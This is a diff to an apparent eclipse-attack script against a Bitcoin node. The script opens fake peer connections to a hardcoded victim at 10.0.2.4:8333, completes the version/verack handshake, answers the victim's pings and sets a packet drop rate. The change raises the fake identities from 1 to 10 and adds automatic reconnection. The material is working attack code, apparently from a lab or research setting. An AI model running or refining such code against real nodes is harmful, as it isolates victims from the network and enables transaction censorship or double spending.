@@ -23,7 +23,7 @@ import struct
 # Percentage (0 to 1) of packets to drop, else: relayed to victim
 eclipse_packet_drop_rate = 0
 
-num_identities = 1
+num_identities = 10
 
 victim_ip = '10.0.2.4'
 victim_port = 8333
@@ -125,28 +125,17 @@ def make_fake_connection(src_ip, dst_ip, verbose=True):
 	s.connect((dst_ip, dst_port))
 
 	# Send version packet
-	#if verbose: print('\nSending VERSION packet')
 	version = version_packet(src_ip, dst_ip, src_port, dst_port)
-	#if verbose: print(version)
 	s.send(version.to_bytes())
-
 	# Get verack packet
-	#if verbose: print('\nReceiving VERACK packet')
 	verack = s.recv(1924)
-	#if verbose: print(verack) # Next message received must be <= 1924 bytes
-	
 	# Send verack packet
-	#if verbose: print('\nSending VERACK packet')
 	verack = msg_verack(bitcoin_protocolversion)
-	#if verbose: print(verack)
 	s.send(verack.to_bytes())
-
 	# Get verack packet
-	#if verbose: print('\nReceiving VERACK packet')
 	verack = s.recv(1024)
-	#if verbose: print(verack) # Next message received must be <= 1024 bytes
 
-	if verbose: print('Connection successful')
+	if verbose: print('Connection successful!')
 
 	identity_address.append((src_ip, src_port))
 	identity_socket.append(s)
@@ -191,9 +180,6 @@ def packet_received(msg_raw, socket, from_ip, from_port, to_ip, to_port, interfa
 		payload_length_valid = False
 
 	if not is_bitcoin: return
-	print(f'{msg_type} size = {len(msg_raw)}')
-	print(f'payload_valid={payload_valid}')
-	print(f'payload_length_valid={payload_length_valid}')
 	if not payload_valid: return
 	if not payload_length_valid: return
 
@@ -203,11 +189,19 @@ def packet_received(msg_raw, socket, from_ip, from_port, to_ip, to_port, interfa
 	# Relay Bitcoin packets that aren't from the victim
 	if from_ip == victim_ip:
 		print(f'*** Message received ** addr={from_ip} ** cmd={msg_type}')
+		try:
+			if msg_type == 'ping':
+				pong = msg_pong(bitcoin_protocolversion)
+				pong.nonce = msg.nonce
+				socket.send(pong.to_bytes())
 
-		if msg_type == 'ping':
-			pong = msg_pong(bitcoin_protocolversion)
-			pong.nonce = msg.nonce
-			socket.send(pong.to_bytes())
+		except Exception as e:
+			print("Closing socket because of error: " + str(e))
+			close_connection(rand_i)
+			time.sleep(5)
+			make_fake_connection(rand_ip, victim_ip, False) # Use old IP
+			#make_fake_connection(random_ip(), victim_ip, False)
+			sys.exit() # Stop the current thread that sniffs for packets on this interface
 
 	""" Relaying code
 	elif packet[IP].dst == attacker_ip:
